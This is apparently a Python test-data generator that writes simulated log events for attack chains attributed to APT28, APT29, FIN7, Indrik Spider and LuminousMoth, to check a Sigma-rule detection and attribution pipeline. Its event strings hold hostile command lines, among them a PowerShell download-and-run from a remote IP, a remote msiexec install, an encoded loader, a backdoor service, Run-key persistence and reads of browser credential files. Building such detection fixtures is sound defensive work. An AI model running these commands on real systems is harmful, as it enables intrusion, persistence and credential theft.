"""
模式 2: 生成仿真实事件，让 Sigma 规则检测生成 TTP
事件不带 threat.technique.id，需要 Sigma 匹配后才有 TTP
用于验证完整流程（事件 -> Sigma 检测 -> TTP -> 归因）
"""
import json
import sys
import uuid
from datetime import datetime, timedelta
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[2]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))


# ========== 仿真实事件模板 ==========
# 这些事件的特征能被 Sigma 规则检测到

def _ts(base, offset_s):
    return (base + timedelta(seconds=offset_s)).isoformat() + "Z"


def _event_base(ts, host, category, action="", outcome="", dataset="windows"):
    return {
        "@timestamp": ts,
        "event": {
            "id": str(uuid.uuid4()),
            "category": category,
            "action": action,
            "outcome": outcome,
            "dataset": dataset,
        },
        "host": {"name": host},
    }


def _attach_process(event, pid, ppid, name, exe, cmd, start_time):
    event["process"] = {
        "pid": pid,
        "parent": {"pid": ppid},
        "name": name,
        "executable": exe,
        "command_line": cmd,
        "start_time": start_time,
    }


def _attach_file(event, path, action="read"):
    name = path.split("\\")[-1].split("/")[-1]
    ext = name.split(".")[-1] if "." in name else ""
    event["file"] = {"path": path, "name": name, "extension": ext}
    if action:
        event["event"]["action"] = action


def _attach_network(event, src_ip, src_port, dst_ip, dst_port, proto, direction="outbound"):
    event["source"] = {"ip": src_ip, "port": src_port}
    event["destination"] = {"ip": dst_ip, "port": dst_port}
    event["network"] = {"protocol": proto, "direction": direction}


def _attach_user(event, name):
    event["user"] = {"name": name}


# ========== APT 攻击链仿真 ==========

def _apt28_chain(base, host):
    """APT28 (Fancy Bear) 仿真攻击链"""
    events = []

    # 1. 暴力破解登录
    e = _event_base(_ts(base, 1), host, "authentication", action="login", outcome="failure")
    _attach_user(e, "admin")
    _attach_network(e, "59.64.129.102", 53422, "192.168.1.5", 22, "ssh", "inbound")
    events.append(e)

    # 2. 成功登录
    e = _event_base(_ts(base, 3), host, "authentication", action="login", outcome="success")
    _attach_user(e, "admin")
    _attach_network(e, "59.64.129.102", 53423, "192.168.1.5", 22, "ssh", "inbound")
    events.append(e)

    # 3. 信息收集 - net 命令
    e = _event_base(_ts(base, 5), host, "process")
    _attach_process(e, 4100, 3000, "net.exe", "C:\\Windows\\System32\\net.exe", "net user /domain", _ts(base, 4))
    events.append(e)

    # 4. PowerShell 下载
    e = _event_base(_ts(base, 7), host, "process")
    _attach_process(e, 4200, 3000, "powershell.exe",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://45.33.2.1/a.ps1')",
                    _ts(base, 6))
    events.append(e)

    # 5. 伪装进程
    e = _event_base(_ts(base, 9), host, "process")
    _attach_process(e, 4300, 4200, "svchost.exe", "C:\\Users\\Public\\svchost.exe", "svchost.exe -k netsvcs", _ts(base, 8))
    events.append(e)

    # 6. 外连 C2
    e = _event_base(_ts(base, 11), host, "network")
    _attach_network(e, "192.168.1.5", 51500, "45.33.2.1", 443, "https", "outbound")
    events.append(e)

    # 7. 敏感文件访问
    e = _event_base(_ts(base, 13), host, "file", action="read")
    _attach_file(e, "C:\\Users\\Admin\\Documents\\passwords.txt", "read")
    events.append(e)

    # 8. 数据外传
    e = _event_base(_ts(base, 15), host, "network")
    _attach_network(e, "192.168.1.5", 51600, "198.51.100.23", 443, "https", "outbound")
    events.append(e)

    # 9. SMB 横向移动
    e = _event_base(_ts(base, 17), host, "network")
    _attach_network(e, "192.168.1.5", 51700, "192.168.1.20", 445, "smb", "outbound")
    events.append(e)

    # 10. 持久化 - 注册表
    e = _event_base(_ts(base, 19), host, "file", action="write")
    _attach_file(e, "C:\\Windows\\System32\\Tasks\\MicrosoftEdgeUpdateTaskMachineCore", "write")
    events.append(e)

    return events


def _apt29_chain(base, host):
    """APT29 (Cozy Bear) 仿真攻击链"""
    events = []

    # 1. 合法账户登录
    e = _event_base(_ts(base, 1), host, "authentication", action="login", outcome="success")
    _attach_user(e, "service_account")
    _attach_network(e, "10.0.0.50", 50000, "192.168.1.5", 3389, "rdp", "inbound")
    events.append(e)

    # 2. WMI 执行
    e = _event_base(_ts(base, 3), host, "process")
    _attach_process(e, 4100, 3000, "wmic.exe", "C:\\Windows\\System32\\wbem\\wmic.exe",
                    "wmic process call create \"powershell -enc AAAA\"", _ts(base, 2))
    events.append(e)

    # 3. PowerShell 混淆执行
    e = _event_base(_ts(base, 5), host, "process")
    _attach_process(e, 4200, 4100, "powershell.exe",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=", _ts(base, 4))
    events.append(e)

    # 4. 代理连接
    e = _event_base(_ts(base, 7), host, "network")
    _attach_network(e, "192.168.1.5", 51500, "45.33.2.1", 8080, "http", "outbound")
    events.append(e)

    # 5. 删除文件清理痕迹
    e = _event_base(_ts(base, 9), host, "file", action="delete")
    _attach_file(e, "C:\\Windows\\Temp\\payload.exe", "delete")
    events.append(e)

    # 6. 修改时间戳
    e = _event_base(_ts(base, 11), host, "file", action="modify")
    _attach_file(e, "C:\\Windows\\System32\\config\\SAM", "modify")
    events.append(e)

    # 7. 恶意工具开发
    e = _event_base(_ts(base, 13), host, "process")
    _attach_process(e, 4300, 3000, "csc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
                    "csc.exe /out:C:\\Temp\\loader.exe loader.cs", _ts(base, 12))
    events.append(e)

    # 8. 动态 DNS
    e = _event_base(_ts(base, 15), host, "network")
    _attach_network(e, "192.168.1.5", 51600, "203.0.113.99", 53, "dns", "outbound")
    events.append(e)

    # 9. 启动脚本持久化
    e = _event_base(_ts(base, 17), host, "file", action="write")
    _attach_file(e, "/etc/rc.local", "write")
    events.append(e)

    # 10. 供应链信任关系利用
    e = _event_base(_ts(base, 19), host, "process")
    _attach_process(e, 4400, 3000, "msiexec.exe", "C:\\Windows\\System32\\msiexec.exe",
                    "msiexec /i http://trusted-vendor.com/update.msi /quiet", _ts(base, 18))
    events.append(e)

    return events


def _fin7_chain(base, host):
    """FIN7 仿真攻击链"""
    events = []

    # 1. 合法账户
    e = _event_base(_ts(base, 1), host, "authentication", action="login", outcome="success")
    _attach_user(e, "finance_user")
    _attach_network(e, "10.0.0.50", 50100, "192.168.1.5", 3389, "rdp", "inbound")
    events.append(e)

    # 2. 混淆 PowerShell
    e = _event_base(_ts(base, 3), host, "process")
    _attach_process(e, 4100, 3000, "powershell.exe",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell -w hidden -ep bypass -c $c=[Convert]::FromBase64String('...');IEX([Text.Encoding]::UTF8.GetString($c))",
                    _ts(base, 2))
    events.append(e)

    # 3. WMI 执行
    e = _event_base(_ts(base, 5), host, "process")
    _attach_process(e, 4200, 3000, "wmic.exe", "C:\\Windows\\System32\\wbem\\wmic.exe",
                    "wmic /node:192.168.1.20 process call create cmd.exe", _ts(base, 4))
    events.append(e)

    # 4. 隧道连接
    e = _event_base(_ts(base, 7), host, "network")
    _attach_network(e, "192.168.1.5", 51500, "45.33.2.1", 443, "https", "outbound")
    events.append(e)

    # 5. 横向移动 SMB
    e = _event_base(_ts(base, 9), host, "network")
    _attach_network(e, "192.168.1.5", 51600, "192.168.1.20", 445, "smb", "outbound")
    events.append(e)

    # 6. 服务执行
    e = _event_base(_ts(base, 11), host, "process")
    _attach_process(e, 4300, 600, "cmd.exe", "C:\\Windows\\System32\\cmd.exe",
                    "cmd /c sc create backdoor binPath= \"C:\\Windows\\Temp\\svc.exe\"", _ts(base, 10))
    events.append(e)

    # 7. Web 服务通信
    e = _event_base(_ts(base, 13), host, "network")
    _attach_network(e, "192.168.1.5", 51700, "198.51.100.23", 80, "http", "outbound")
    events.append(e)

    # 8. 凭据文件
    e = _event_base(_ts(base, 15), host, "file", action="read")
    _attach_file(e, "C:\\Users\\Admin\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", "read")
    events.append(e)

    # 9. 勒索软件部署
    e = _event_base(_ts(base, 17), host, "file", action="write")
    _attach_file(e, "C:\\Users\\Public\\Documents\\README_ENCRYPTED.txt", "write")
    events.append(e)

    # 10. 加密文件
    e = _event_base(_ts(base, 19), host, "file", action="modify")
    _attach_file(e, "C:\\Users\\Admin\\Documents\\financial_report.xlsx.encrypted", "modify")
    events.append(e)

    return events


def _indrik_spider_chain(base, host):
    """Indrik Spider (Evil Corp) 仿真攻击链"""
    events = []

    # 1. RDP 登录
    e = _event_base(_ts(base, 1), host, "authentication", action="login", outcome="success")
    _attach_user(e, "admin")
    _attach_network(e, "10.0.0.50", 50123, "192.168.1.5", 3389, "rdp", "inbound")
    events.append(e)

    # 2. net view 发现
    e = _event_base(_ts(base, 3), host, "process")
    _attach_process(e, 4100, 3000, "net.exe", "C:\\Windows\\System32\\net.exe",
                    "net view /domain", _ts(base, 2))
    events.append(e)

    # 3. WMI 执行
    e = _event_base(_ts(base, 5), host, "process")
    _attach_process(e, 4200, 3000, "wmic.exe", "C:\\Windows\\System32\\wbem\\wmic.exe",
                    "wmic process list brief", _ts(base, 4))
    events.append(e)

    # 4. PowerShell 执行
    e = _event_base(_ts(base, 7), host, "process")
    _attach_process(e, 4300, 3000, "powershell.exe",
                    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "powershell -enc JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA", _ts(base, 6))
    events.append(e)

    # 5. SMB 横向移动
    e = _event_base(_ts(base, 9), host, "network")
    _attach_network(e, "192.168.1.5", 51500, "192.168.1.20", 445, "smb", "outbound")
    events.append(e)

    # 6. 恶意工具编译
    e = _event_base(_ts(base, 11), host, "process")
    _attach_process(e, 4400, 3000, "csc.exe", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe",
                    "csc.exe /out:C:\\Temp\\cryptor.exe cryptor.cs", _ts(base, 10))
    events.append(e)

    # 7. 伪装进程
    e = _event_base(_ts(base, 13), host, "process")
    _attach_process(e, 4500, 3000, "svchost.exe", "C:\\Users\\Public\\svchost.exe",
                    "svchost.exe -k netsvcs", _ts(base, 12))
    events.append(e)

    # 8. 凭据读取
    e = _event_base(_ts(base, 15), host, "file", action="read")
    _attach_file(e, "C:\\Users\\Admin\\AppData\\Roaming\\credentials.txt", "read")
    events.append(e)

    # 9. 组策略修改
    e = _event_base(_ts(base, 17), host, "file", action="write")
    _attach_file(e, "C:\\Windows\\System32\\GroupPolicy\\Machine\\Scripts\\Startup\\deploy.ps1", "write")
    events.append(e)

    # 10. 勒索加密
    e = _event_base(_ts(base, 19), host, "file", action="write")
    _attach_file(e, "C:\\Users\\Public\\Documents\\DECRYPT_INSTRUCTIONS.txt", "write")
    events.append(e)

    return events


def _luminousmoth_chain(base, host):
    """LuminousMoth 仿真攻击链"""
    events = []

    # 1. USB 传播
    e = _event_base(_ts(base, 1), host, "file", action="read")
    _attach_file(e, "E:\\autorun.inf", "read")
    events.append(e)

    # 2. 伪装进程
    e = _event_base(_ts(base, 3), host, "process")
    _attach_process(e, 4100, 3000, "svchost.exe", "C:\\Windows\\Temp\\svchost.exe",
                    "svchost.exe -k netsvcs", _ts(base, 2))
    events.append(e)

    # 3. 恶意工具开发
    e = _event_base(_ts(base, 5), host, "process")
    _attach_process(e, 4200, 3000, "gcc.exe", "C:\\MinGW\\bin\\gcc.exe",
                    "gcc.exe backdoor.c -o C:\\Temp\\update.exe", _ts(base, 4))
    events.append(e)

    # 4. DLL 劫持
    e = _event_base(_ts(base, 7), host, "file", action="write")
    _attach_file(e, "C:\\Program Files\\Common Files\\System\\version.dll", "write")
    events.append(e)

    # 5. 本地数据收集
    e = _event_base(_ts(base, 9), host, "file", action="read")
    _attach_file(e, "C:\\Users\\Admin\\Documents\\confidential.docx", "read")
    events.append(e)

    # 6. 代码签名伪造
    e = _event_base(_ts(base, 11), host, "process")
    _attach_process(e, 4300, 3000, "signtool.exe", "C:\\Windows\\SDK\\signtool.exe",
                    "signtool sign /f stolen.pfx C:\\Temp\\malware.exe", _ts(base, 10))
    events.append(e)

    # 7. 压缩数据
    e = _event_base(_ts(base, 13), host, "process")
    _attach_process(e, 4400, 3000, "rar.exe", "C:\\Program Files\\WinRAR\\rar.exe",
                    "rar a -hp C:\\Temp\\exfil.rar C:\\Users\\Admin\\Documents\\*", _ts(base, 12))
    events.append(e)

    # 8. 注册表修改
    e = _event_base(_ts(base, 15), host, "process")
    _attach_process(e, 4500, 3000, "reg.exe", "C:\\Windows\\System32\\reg.exe",
                    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /d C:\\Temp\\update.exe", _ts(base, 14))
    events.append(e)

    # 9. 文件系统发现
    e = _event_base(_ts(base, 17), host, "process")
    _attach_process(e, 4600, 3000, "cmd.exe", "C:\\Windows\\System32\\cmd.exe",
                    "cmd /c dir C:\\Users\\Admin\\Documents /s /b", _ts(base, 16))
    events.append(e)

    # 10. 数据外传
    e = _event_base(_ts(base, 19), host, "network")
    _attach_network(e, "192.168.1.5", 51500, "198.51.100.23", 443, "https", "outbound")
    events.append(e)

    return events


APT_CHAINS = {
    "APT28": _apt28_chain,
    "APT29": _apt29_chain,
    "FIN7": _fin7_chain,
    "Indrik_Spider": _indrik_spider_chain,
    "LuminousMoth": _luminousmoth_chain,
}


def generate_all(output_dir: Path):
    output_dir.mkdir(parents=True, exist_ok=True)
    base_time = datetime.utcnow()

    for apt_name, chain_func in APT_CHAINS.items():
        events = chain_func(base_time, "PC-1")
        file_path = output_dir / f"{apt_name}.jsonl"
        with file_path.open("w", encoding="utf-8") as f:
            for e in events:
                f.write(json.dumps(e, ensure_ascii=False) + "\n")
        print(f"[仿真事件] 生成 {len(events)} 事件 -> {file_path}")


if __name__ == "__main__":
    generate_all(Path(__file__).resolve().parent / "apt_events" / "sigma")
